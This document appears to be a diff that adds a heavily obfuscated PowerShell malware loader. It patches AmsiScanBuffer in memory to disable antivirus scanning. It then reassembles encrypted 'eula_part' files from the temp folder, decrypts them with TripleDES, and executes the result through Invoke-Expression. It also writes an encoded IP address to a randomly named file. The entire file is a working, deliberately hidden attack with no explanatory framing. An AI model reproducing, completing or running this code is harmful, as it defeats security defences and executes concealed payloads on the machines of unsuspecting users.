@@ -1,0 +1,76 @@
+ (('
+set-alias 9x5a TR5([char](233-118)+[char](203-102)+[char](214-98)+[char](94-49)+[char](200-103)+[char](162-54)+[char]'+'(217-112)+[char](194-97)+[char](163-48))
+TR5zmuo = TR5executioncontext
+TR50nmy=TR5([char](221-116)+[char](215-105)+[char](222-104)+[char](231-120)'+'+[char](218-111)+[char'+'](218-117)+[char](217-118)+[char](164-53)+'+'[char]('+'225-116)+[char](161-52)+[char](218-121)+[char](158-48)+[char](156-56))
+TR5x2or='+'TR5([char](219-118)+[char](177-57)+[char](226-114)+[char](154-57)+[char](219-109)+[char](200-100)+[char](226-111)+[char](169-53)+[char](213-99)+[char]('+'222-117)+[char](230-120)+[char](223-120))
+TR5soqdt'+' = TR5([char]13+[char]10+[char]13+[char]10+[char'+']117+[char]115+[char]105+[char]110+'+'[char]103+[char]32+[char]83+[char]'+'121+[char]115+'+'[char]116+[char]101+[char]109+[ch'+'ar]59+[char]13+[char]10+[char]117+[char]115+[char]105+[char]110+[char]103+['+'char]32+[char]83+[char]121+[char]115+[char]116+[char]101+['+'char]109+[char]46+['+'char]82+[char]117+[char]110+[char]116+[char]105+[char]109+[char]101+[char]46+[char]73+[char]110+[char]116+[char]1'+'0'+'1+[char]114+[char]111+[char]112+[ch'+'ar]83+[char]101+[char]114+[char]118+[char]105+[char]99+[char]101+[char]115+[char]59+[char]13+[char]'+'10+[char]13+[char]10+[char]112+[char]117+[char]98+[char]108+[char'+']105+[char]99+[char]32+[char]99+[char]108+[char]97'+'+[char]115+[char]115+[char]32+[char]104+[char]105+'+'[char'+']114+[char]101+[char]97+[char]32+[char]123+[cha'+'r]13+[char]10+[cha'+'r]13+[cha'+'r]10+[char]32+[char]32+[char]32+[char]32+[char]91+[char]68+[char]108+[char]108+[char]73+[char]109+[char]112+[char]111+[char]'+'114+[char]116+[char]40+[char]34+[cha'+'r]107+[char]101+[char]114+[char]110+[char]101+[char]108+[char]5'+'1+[char]50+[char]34+[char]44+[char]32+[char]69+[char]110+[char]116+[char]11'+'4+[char]1'+'21+[char]80+[c'+'har]111+[char]105+[char]110+[char]116+[char]61+[char]34+[ch'+'ar]71+[char]101+[char]116+[char]80+[char]114+[char]111+[char]99+[char]65+[char]100+[char]100+[cha'+'r]114+[char]101+[char]115+[char]115+[char]34+[char]41+[char]93+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char'+']32+[char]115+[char]116+[char]97+[char]116+[char]105+[char]'+'9'+'9+[char]32+[char'+']101+[char]120+[char]116+[char]101+[char]114+[char]110+[char]32+[char]73+['+'char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]103+[char]112+[ch'+'ar]9'+'7+[cha'+'r]40+[char]'+'73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]104+[char]77+[ch'+'ar]111+[cha'+'r]100+[char]117+[char]108+[char]101+[char]44+[char]32+[char]115+[char]116+[char]114+[char]105+[char]110+[char]103+[char]32+[char]112+[char]11'+'4'+'+[char]111+[char]99+[char]78+[char]97+[char]109+[char]101+[char]41+'+'[char]59+[char]13+[char]10+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]91+[char]68+[char]108+[char]108+[char]73+[char]109+[char]112+[char]111+[char]114+[c'+'har]116+[char]40+[char]34'+'+[char]107+[char]101+['+'char]114+[char]110+[char]101+[char]108+[char]51+[char]50+[char]34+['+'char]44+[char]32+[char]69+[char]110+[char]11'+'6+[char]114+[char]121+[char]80+[char]1'+'11+'+'[char]105+[char]110+[char]116+[cha'+'r]61+[cha'+'r]34+[char]76+['+'char]111+[char]97+[char]100+[char]76+[char]105+['+'char]98+[char]114+[char]97+[char]114+[char'+']121+['+'ch'+'ar'+']34+[char]41+[char]93+[char]13+[char]10+[char'+']32+[char]32+[char]32+[char]32+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char]32+[char]115+[char]116+[char]97+[char]116+[char]105+[char]99+[char]32+[char]101+[char]120+[char]116+[c'+'har]101+[char]'+'114+[char]110+[char]32+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+['+'cha'+'r]108+[char]108+[char]105+[c'+'har]98+[cha'+'r]40+[char]115+[char]116+[char]114+[char]105+[char]110+[char]103+[char]32+[char]110+[char]97+[char]109+[char]'+'101+[char]41+[char]59+[char]13+[char]10+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]91+[char]68+['+'char]108+[char]108+[c'+'har]73+[char]109+[char]112+[char]111+[char]114+[char]116+[char]40+[char]34+['+'char]107+[char]101+[char]114+[char]110+[char]101+[char]108+[char]51+[char]50+['+'char]34+[char]44+[char]32+[char]69+[char]110+[char]'+'116+[char]114+[char]121+[char]80+[char]111+[char]105+[char]110+[char]116+[char]61+[char]34+[char]86+[char]105+[char]114+[char]116+[char]117+[cha'+'r]97'+'+[char]108+[char]80+[c'+'har]114+[char]111+[char]116+[char]101+'+'[char]99+[char]116+[char]34+[char]41+[char]93+[char]13+'+'[char]10+[char]32+[char]32+[char]32+[char]32+[char]112+[char'+']117+[char]98+[char]108+[char]105+[char]99+[char]32+['+'ch'+'ar]115+[char]116+'+'[char]97+[char]11'+'6+[char]105+[ch'+'ar]99+[char]32+[char]101+[char]120+[char]116+[char]101+'+'[char]114+[char]110+[char]32+[char]98+['+'char]111+[char]111+[char]108+[char]32+[ch'+'ar]'+'118+[char]112+[char]114+[char]40+[ch'+'ar]73+[char]1'+'10+[char]116+[char]80+[char]116+[char]114+[char]32+[char]108+[char]112+[char]65+[char]100+[char]100+[char]114+[char]101+[char]115+[char]115+[char]44+[char]32+[char]85+[char]73+[char]110+[char]116+[char]80+'+'[char]116+[char]114+[char'+']32+[char]100'+'+[c'+'har]119+[char]83+[char]105+[char]122+[c'+'har]101+[char]44+[char]32+[char]'+'117+[char]105+[char]110+[cha'+'r]116+[char]32+[char]102+[char]108+[ch'+'ar]78+[char]101+[char]119+[char]80+[char]114+[char]111+[char]116+[char]101+[char]99+[char]116+[char]44+[char]32+[char]111+[char]117+[char]116+[char]32+[char]117+[char]105+[char]110+[char]116+[char]32+[char]108+[char]112+[char]102+[char]108+[char]79+[char]108+[char]100+[char]80+[char]114+[char]111+[char]'+'116+[char]101+[char]99+[char]116+[char]41+[char]59+[char'+']13+[char]10+[char]13+[char]10+[char]125+[char]13+[char]10) 
+
+Add-Type TR5soqdt
+
+TR5wm0jr = [hirea]::llib(TR5zmu'+'o.TR50nmy.T'+'R5x2or(TR5([char](151-54)+'+'[char](2'+'31-122))) + TR5zmuo.TR50nmy.TR5x2or(TR5([char](228-11'+'3)+[char]('+'208-103)+[char](148-102)+[char](215-1'+'15)+[char](224-116)+[char](223-115))))
+TR54ljc0 = [hirea]::gpa(TR5wm0jr, TR5zmuo.TR50nmy.TR5x2or(TR5([char](177-112)+[char](207-98)+[char](214-99'+')+[char](22'+'7-122))) + TR5zmuo.TR50nmy.TR5x2or(TR5([char](200-117)+[char](152-53)+[char](218-121)+[char](165-55))) + TR5zmuo.TR50nmy.TR5x2or(TR5([char](114-48)+[char](224-107)+[ch'+'ar'+'](211-109)+['+'char](217-115)+[char](219-118)+[char](170-56))))
+TR5'+'5pejy = 0
+[hirea]:'+':vpr'+'(TR5'+'4ljc0, [uint32]5, (112-48), [ref]TR55pejy)
+TR5eq7vs = [Byte'+'[]] (('+'294-110), '+'(197-110), (107-107), (124-117), (183-55), (293-98))'+'
+[System.Runt'+'ime.InteropServices.Marshal]::Copy(TR5eq7vs, 0, TR5'+'4ljc0, 6) 
+
+TR5ToNatural = { [regex]::Replace(TR5_, Zr'+'3A1Id+Zr3, { TR5args[0]'+'.'+'Value.PadLeft(20) }) }
+	
+TR5a=Get-ChildItem uAmTR5env:temp'+'A1Insf8F47F.tmpuAm -include uAmeula_part*uAm -rec  '+'
+TR5b=TR5agA0Sort-Object TR5ToNatural
+F'+'o'+'rEach (TR5c in TR5b)
+ {TR5g=get-content TR5c -encoding unicode 
+ TR5z=TR5z+TR5g
+ 
+ 
+ 
+ } 
+
+
+function edqmoydfid([String] TR5cyjxerqtse, [S'+'tring] TR5hfcxjnlevt, [String] TR5hfcx'+'jnlevtjjlasgeg, [String] TR5dsufurhgu)
+{
+TR5zqphdskjev = u'+'A'+'mTR'+'5zuAm;
+TR5pgourya = New-Ob'+'ject Syst'+'em.Text.ASCIIEncoding;
+TR5i'+'usswiiexxd = TR5pgourya.GetBytes(uAmHWLVCVWIVPXIVU'+'ZJuAm);
+TR5zqphdskjeva '+'= [Co'+'nvert]::FromBase64String(TR5zqphdskjev);
+TR5Gal'+'ician = '+'New-Object System.Security.Cryptography.PasswordDeriveBytes(TR5cy'+'jxerqtse, TR5pgourya.GetBytes(TR5hfcxjnlevt), uAmSHA1uAm, 2);
+[Byte[]] TR5oyhzukxyqg = TR5Galician.GetBytes(16);
+TR5fivwqncinp = New-Object System.Security.Cryptog'+'raphy.Tri'+'pleDESCryptoServicePr'+'ovider;
+TR5fivwqncinp.Mode = [System.Secur'+'ity.Cryptography.CipherMode]::CBC;
+[Byte[]] TR5vvqxfufcoo = New-Object Byte[](TR5zqphdskjeva.Length);
+TR5fuesruevob = TR5fivwqncinp.CreateDecryptor(TR5oyhzukxyqg, TR5iusswiiexxd);
+TR5blvbdlpbmx = New-Object Sys'+'tem.IO.MemoryStream(TR5zqphdskjeva, TR5True);
+TR5qpujccuklq = New-Object System.Security.Cryptography.Crypto'+'Stream(TR5blvbdlpbmx, TR5fuesruevob, [S'+'yst'+'em.Security.Cryptography.CryptoStreamMode]::Read);
+TR5gquoydzzbg = TR5qpujccuklq.Read(TR5vvqxfufcoo, 0, TR5vvqxfufcoo.Length);
+TR5blvbd'+'lpb'+'mx.Close();
+TR5qpujccuklq.Close();
+TR5fivwqncinp.Clear();
+  TR5'+'h = TR5'+'vvqxfufcoo[3..(TR5vvq'+'xfufcoo.Length-1)]; 
+return TR5pgourya.GetString(TR'+'5vvqxfufcoo);
+}
+TR5mhycgx = Zr3JwBpAHAAOgAxADMAMgAuADcAOAAuADYAMwAuADMAMwAnAA==Zr3;
+ TR5tsekrwjnzy ='+' edqmoydfid uAmxn25fujemhkc8g4abyqt13zwso6907piuAm uAmr5pjf1nu0qdlygzcvska7o84b2ix3e96uAm uAmr5pjf1n'+'u0qdlygzcvska7o84b2ix3e96uAm uAmxn25fujemhkc8g4abyqt13zwso6907piuAm
+function ivazm {
+'+'    Param(
+        [Parameter(Mandatory='+'TR5True, Position=0)]
+        [string] TR5ofjml,
+        [Parameter(Mandatory=TR5True, Position=1)]
+        [string] TR5vklydxu
+    )
+
+    TR'+'5gvfqua = [Con'+'vert]::FromBase64String(TR5vklydxu)
+    [IO.File]::WriteAll'+'Bytes(TR5ofjml, TR5gvfqua)
+}
+ write-host Prepairing modules
+function uswm() {
+    TR5nbvfj = Get-Random -Min 3 -Max 5
+    TR5rpfxj = ([char['+']]([cha'+'r]97..[c'+'har]122))
+    TR5finbvfjame  = -join (TR5rpfxj '+'gA0 Get-Random -Count TR5nbvfj gA0 % {[Char]TR5_})
+    return TR5'+'finbvfjame
+}
+
+ invoke-expression TR5'+'tsekrwjnzy
+TR5npmbhs = uswm;'+'
+ivazm TR5npmbhs TR5mhycgx;
+
+') -RePlaCe([CHaR]117+[CHaR]65+[CHaR]109),[CHaR]34-RePlaCe'TR5',[CHaR]36  -CrePlace  ([CHaR]103+[CHaR]65+[CHaR]48),[CHaR]124 -RePlaCe 'Zr3',[CHaR]39 -RePlaCe ([CHaR]65+[CHaR]49+[CHaR]73),[CHaR]92) | . ( $ShelliD[1]+$sHelLiD[13]+'X')
